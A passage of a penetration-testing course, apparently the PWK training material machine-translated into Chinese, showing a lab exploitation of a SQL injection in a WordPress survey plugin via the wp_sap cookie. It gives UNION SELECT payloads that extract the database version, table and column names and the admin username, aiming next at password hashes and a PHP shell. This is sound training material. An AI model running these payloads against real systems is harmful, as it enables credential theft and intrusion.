<div style="position:absolute;top:163870;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 323：向中继器发送请求 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:164119;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="139"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 139 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:164152;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:165229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:165229;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:165229;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">756</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:164242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:164263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后我们单击“中继器”选项卡并查看原始形式的 cookie。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:164741;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 324：在中继器中查看请求</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:164772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们从原始漏洞中获取有效载荷，将其放入 cookie，然后将请求发送到</font></font></nobr></div>
<div style="position:absolute;top:164791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器。</font><font style="vertical-align: inherit;">可以在清单 865 中找到有效负载。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:164826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]</font></font></nobr></div>
<div style="position:absolute;top:164846;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 865 - 原始 SQL 注入负载 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:165307;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="140"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 140 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:165340;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:166417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:166417;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:166417;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">757</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:165430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2.1.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:165451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据漏洞利用，有效载荷可以插入到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wp_sap</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cookie 变量值中。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:165470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cookie 变量的值在“=”符号之后开始，并且必须以分号结束。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:166028;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 325：使用有效负载发送请求</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:166059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用代码中提到SQL注入的结果会放在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sss_params中</font></font></i></nobr></div>
<div style="position:absolute;top:166078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“脚本”标签中的变量。</font><font style="vertical-align: inherit;">在 Burp 中搜索变量应该会将我们带到</font></font></nobr></div>
<div style="position:absolute;top:166097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SQL注入的输出。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:166495;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="141"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 141 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:166528;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:167605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:167605;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:167605;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">758</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:166618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2.1.3</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:166639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以将 Burp 设置为将来“自动滚动”到这个位置，以便更容易地利用</font></font></nobr></div>
<div style="position:absolute;top:166658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不必每次都滚动查找输出。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:167198;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 326：搜索和设置自动滚动</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:167229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此输出中，我们可以看到正在使用的数据库版本。</font><font style="vertical-align: inherit;">这向我们展示了 SQL 注入</font></font></nobr></div>
<div style="position:absolute;top:167248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作！</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:167283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;script type='text/javascript'&gt;</font></font></nobr></div>
<div style="position:absolute;top:167300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/* &lt;![CDATA[ */</font></font></nobr></div>
<div style="position:absolute;top:167317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var sss_params = {"survey_options":"{\"options\":\"[\\\"bottom\\\",\\\"easeInOutBack\\</font></font></nobr></div>
<div style="position:absolute;top:167334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\",\\\"\\\",\\\"-webkit-linear-gradient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 2</font></font></nobr></div>
<div style="position:absolute;top:167351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">04) 70%);-moz-linear-gradient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 204) 70%);-</font></font></nobr></div>
<div style="position:absolute;top:167368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ms-linear-gradient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 204) 70%);-o-linear-gr</font></font></nobr></div>
<div style="position:absolute;top:167385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">adient(top , rgb(255, 255, 255) 35% , rgb(204, 204, 204) 70%);线性梯度(top, rg</font></font></nobr></div>
<div style="position:absolute;top:167402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">b(255, 255, 255) 35% , rgb(204, 204, 204) 70%);\\\",\\\"rgb(0, 0, 0)\\\",\\\"rgb (93, 9</font></font></nobr></div>
<div style="position:absolute;top:167419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3, 93)\\\\",\\"1\\\\",\\\\"0\\\\",\\\\"12\\\\",\\\\"9\\\\",\ \\"8\\\\",500,\\"谢谢你</font></font></nobr></div>
<div style="position:absolute;top:167436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你的反馈！\\\",\\\"0\\\",\\\"0\\\",\\\"0\\\"]\",\"plugin_url\":\"http :\\\/\\\/沙盘</font></font></nobr></div>
<div style="position:absolute;top:167453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x.local\\\/wp-content\\\/plugins\\\/wp-survey-and-poll\",\"admin_url\":\"http:\\\/\\\/</font></font></nobr></div>
<div style="position:absolute;top:167470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sandbox.local\\\/wp-admin\\\/admin-ajax.php\",\"survey_id\":\"1550849657\",\"style\":\</font></font></nobr></div>
<div style="position:absolute;top:167486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"modal\",\"expired\":\"false\",\"debug\":\"true\",\"questions\":[[\"你喜欢吗？</font></font></nobr></div>
<div style="position:absolute;top:167504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新站点？\",\"Yes\",\"No\"],[\" </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.3.20-MariaDB\</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> "]]}"};</font></font></nobr></div>
<div style="position:absolute;top:167521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/* ]]&gt; */</font></font></nobr></div>
<div style="position:absolute;top:167538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/脚本&gt;</font></font></nobr></div>
<div style="position:absolute;top:167557;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 866 - 通过 SQL 注入提取数据库版本 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:167683;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="142"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 142 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:167716;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:168793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:168793;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:168793;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">759</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:167812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们知道这个 WordPress 实例使用的数据库是 10.3.20-MariaDB。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:167874;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB 是 MySQL 的一个分支。</font><font style="vertical-align: inherit;">它被设计为即插即用</font></font></i></nobr></div>
<div style="position:absolute;top:167893;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 的替代方案和用于 MySQL 的 SQL 注入漏洞通常有效</font></font></i></nobr></div>
<div style="position:absolute;top:167913;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也适用于 MariaDB。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:167975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们知道 SQL 注入是有效的，我们需要确定下一步。</font><font style="vertical-align: inherit;">在上传一个</font></font></nobr></div>
<div style="position:absolute;top:167994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 MariaDB 的 PHP shell 可能使我们能够在 WordPress 上远程执行代码</font></font></nobr></div>
<div style="position:absolute;top:168013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，如果我们没有更多关于</font></font></nobr></div>
<div style="position:absolute;top:168033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统。</font></font></nobr></div>
<div style="position:absolute;top:168065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们从更简单的事情开始，提取管理员的用户名和密码哈希。</font><font style="vertical-align: inherit;">去做这个，</font></font></nobr></div>
<div style="position:absolute;top:168085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要获取表列表，找到用户的表，获取列列表，然后最后提取</font></font></nobr></div>
<div style="position:absolute;top:168104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相关信息。</font></font></nobr></div>
<div style="position:absolute;top:168137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要获取表名列表，我们需要查询</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">information_schema.tables</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表以获取</font></font></nobr></div>
<div style="position:absolute;top:168156;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表名列</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这可以通过更改 cookie 负载来完成，如清单 867 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:168191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9, </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">table_name</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ,11 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FROM information_s</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:168208;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chema.tables </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#"]</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:168227;left:376"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 867 - 列出所有表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:168257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，我们还从原始有效负载中删除了“ALL”。</font><font style="vertical-align: inherit;">这是为了减少结果</font></font></nobr></div>
<div style="position:absolute;top:168276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为我们不关心重复值。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:168871;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="143"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 143 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:168904;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:169981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:169981;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:169981;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">760</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:168994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2.1.4</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:169015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同样，有效载荷可以插入到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wp_sap</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cookie 值中。</font><font style="vertical-align: inherit;">和以前一样，cookie 的值</font></font></nobr></div>
<div style="position:absolute;top:169034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从“=”号开始，以分号结束。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:169518;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 327：查询所有表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:169549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果包括一大批表，但对我们来说最突出的是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wp_users</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，因为</font></font></nobr></div>
<div style="position:absolute;top:169569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它很可能包含 WordPress 用户信息。</font></font></nobr></div>
<div style="position:absolute;top:169601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了表名，我们可以开始检索它的列名。</font><font style="vertical-align: inherit;">为此，我们查询</font></font></nobr></div>
<div style="position:absolute;top:169621;left:109"><nobr><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">information_schema.columns 中</font></i><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">column_name</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列</font><font style="vertical-align: inherit;">，将结果限制为那些</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:169640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该表是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wp_users</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这可以通过更新我们的有效负载来完成，如清单 868 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:169675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9, </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">column_name</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ,11 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FROM information_</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:169692;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">schema.columns WHERE table_name='wp_users' </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#"]</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:169711;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 868 - wp_users 表中所有列的列表 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:170059;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="144"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 144 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:170092;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:171169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:171169;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:171169;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">761</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:170182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2.1.5</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:170203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和之前的payload一样，这个payload也会放在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wp_sap的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cookie值中</font></font></nobr></div>
<div style="position:absolute;top:170222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中继器选项卡。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:170706;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 328：查询 wp_users 中的所有列</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:170737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的查询结果显示了几个列名。</font><font style="vertical-align: inherit;">我们最感兴趣的是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user_login</font></font></i></nobr></div>
<div style="position:absolute;top:170757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user_pass</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为这些很可能包含向 WordPress 进行身份验证的凭据</font></font></nobr></div>
<div style="position:absolute;top:170776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实例。</font></font></nobr></div>
<div style="position:absolute;top:170809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们查询用户名。</font><font style="vertical-align: inherit;">为此，我们需要发送一个 SQL 注入请求，要求</font></font></nobr></div>
<div style="position:absolute;top:170828;left:109"><nobr><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">wp_users</font></i><font style="vertical-align: inherit;">表中的</font><font style="vertical-align: inherit;">所有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user_login</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这可以通过如下更新我们的查询来完成。</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:170863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9, </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user_login</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ,11 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FROM wp_users</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> #"]</font></font></nobr></div>
<div style="position:absolute;top:170882;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 869 - 列出所有用户名 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:171247;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="145"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 145 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:171280;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:172357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:172357;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:172357;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">762</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:171370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2.1.6</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:171391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们再次重复与以前相同的注射。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:171875;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 329：查询 wp_users 中的所有用户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:171906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此查询仅公开了一个用户名：wp_ajla_admin。</font><font style="vertical-align: inherit;">现在我们有了用户名，是时候了</font></font></nobr></div>
<div style="position:absolute;top:171925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取密码哈希。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:172435;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="146"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 146 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:172468;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:173545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:173545;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:173545;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">763</font></font></nobr></div>
</span></font>
